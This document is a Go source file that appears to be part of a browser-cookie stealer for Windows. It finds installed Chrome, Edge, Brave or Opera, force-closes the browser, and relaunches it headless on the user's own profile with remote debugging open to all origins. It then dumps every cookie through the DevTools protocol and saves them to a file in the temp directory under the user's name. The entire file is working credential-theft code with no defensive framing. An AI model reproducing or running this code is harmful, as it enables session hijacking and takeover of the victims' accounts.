package target

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"encoding/json"
	"path/filepath"
	"time"
	"net/http"
	"strings"
	"github.com/gorilla/websocket"
)

const port = "9222"
var debugURL = "http://localhost:" + port + "/json"

var CONFIGS = map[string]map[string]string{
	"chrome": {
		"bin":       filepath.Join(os.Getenv("PROGRAMFILES"), "Google", "Chrome", "Application", "chrome.exe"),
		"user_data": filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
	},
	"edge": {
		"bin":       filepath.Join("C:\\Program Files (x86)", "Microsoft", "Edge", "Application", "msedge.exe"),
		"user_data": filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
	},
	"brave": {
		"bin":       filepath.Join(os.Getenv("PROGRAMFILES"), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
		"user_data": filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
	},
	"opera": {
		"bin":       filepath.Join(os.Getenv("LOCALAPPDATA"), "Programs", "Opera", "opera.exe"),
		"user_data": filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
	},
}

func isValidPath(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func closeBrowser(p string) {
	_ = exec.Command("taskkill", "/F", "/IM", filepath.Base(p)).Run()
}

func startBrowser(p, u string) {
    _ = exec.Command(p, "--remote-debugging-port="+port, "--remote-allow-origins=*", "--headless", "--user-data-dir="+u).Start()
    time.Sleep(1 * time.Second) 
}


func getWSURL() (string, error) {
	var wsURL string
	for i := 0; i < 5; i++ {
		r, e := http.Get(debugURL)
		if e != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		defer r.Body.Close()
		var d []map[string]interface{}
		if json.NewDecoder(r.Body).Decode(&d) == nil && len(d) > 0 {
			if wsURL, _ = d[0]["webSocketDebuggerUrl"].(string); wsURL != "" {
				break
			}
		}
		time.Sleep(2 * time.Second)
	}
	if wsURL == "" {
		return "", fmt.Errorf("failed to get WS URL")
	}
	return wsURL, nil
}

func getCookies(url string) ([]interface{}, error) {
	conn, _, err := websocket.DefaultDialer.Dial(url, nil)
	if err != nil {
		return nil, fmt.Errorf("WS connect error: %v", err)
	}
	defer conn.Close()
	conn.WriteJSON(map[string]interface{}{"id": 1, "method": "Network.getAllCookies"})
	var res map[string]interface{}
	conn.ReadJSON(&res)
	cookies, ok := res["result"].(map[string]interface{})["cookies"].([]interface{})
	if !ok {
		return nil, fmt.Errorf("cookie error")
	}
	return cookies, nil
}

func startValidBrowser() (string, bool) {
	for browser, config := range CONFIGS {
		if isValidPath(config["bin"]) && isValidPath(config["user_data"]) {
			closeBrowser(config["bin"])
			startBrowser(config["bin"], config["user_data"])
			return browser, true
		}
	}
	return "", false
}

func getOutputDir() (string, error) {
	tempDir := os.TempDir()
	outputDir := filepath.Join(tempDir, strings.ToLower(os.Getenv("USERNAME")), "chromium")

	err := os.MkdirAll(outputDir, os.ModePerm)
	if err != nil {
		return "", fmt.Errorf("could not create output/chromium directory: %v", err)
	}

	return outputDir, nil
}

func saveCookiesToFile(cookies []interface{}, browserName string) {
	outputDir, err := getOutputDir()
	if err != nil {
		log.Fatal("Failed to get output directory: ", err)
	}

	fileName := filepath.Join(outputDir, fmt.Sprintf("%s_cookies.txt", browserName))

	file, err := os.Create(fileName)
	if err != nil {
		log.Fatal("Failed to create cookies file: ", err)
	}
	defer file.Close()

	cookieData, err := json.MarshalIndent(cookies, "", "    ")
	if err != nil {
		log.Fatal("Failed to marshal cookies: ", err)
	}

	file.Write(cookieData)
}

func ChromiumFetch() {
	foundBrowser := false

	for browserName, config := range CONFIGS {
		if isValidPath(config["bin"]) && isValidPath(config["user_data"]) {
			foundBrowser = true
			log.Printf("Found valid browser: %s\n", browserName)

			closeBrowser(config["bin"])

			startBrowser(config["bin"], config["user_data"])

			wsURL, err := getWSURL()
			if err != nil {
				continue
			}

			cookies, err := getCookies(wsURL)
			if err != nil {
				continue
			}

			saveCookiesToFile(cookies, browserName)
		}
	}

	if !foundBrowser {
		log.Println("No valid browsers found.")
	}
}
